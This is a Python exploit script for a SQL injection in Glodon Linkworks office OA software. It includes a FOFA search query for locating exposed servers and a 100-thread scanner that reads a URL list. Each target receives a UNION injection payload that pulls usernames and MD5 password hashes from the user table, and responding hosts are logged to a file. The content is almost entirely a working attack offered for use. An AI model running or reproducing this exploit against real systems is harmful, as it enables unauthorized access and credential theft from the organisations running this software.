#广联达Linkworks办公OA SQL注入漏洞

#fofa语法：fid=”/yV4r5PdARKT4jaqLjJYqw==”或者body=”/Services/Identification/Server”

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 

  _      _       _                        _        
 | |    (_)     | |                      | |       
 | |     _ _ __ | | ____      _____  _ __| | _____ 
 | |    | | '_ \| |/ /\ \ /\ / / _ \| '__| |/ / __|
 | |____| | | | |   <  \ V  V / (_) | |  |   <\__ \
 |______|_|_| |_|_|\_\  \_/\_/ \___/|_|  |_|\_\___/
                                                   
                                                                                                                                           
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="广联达Linkworks办公OA")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '77'
    }
    data =  "key=1' UNION ALL SELECT top 2 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and "admin" in res.text:
            print(f"f[+]该url存在sql注入漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在sql注入漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()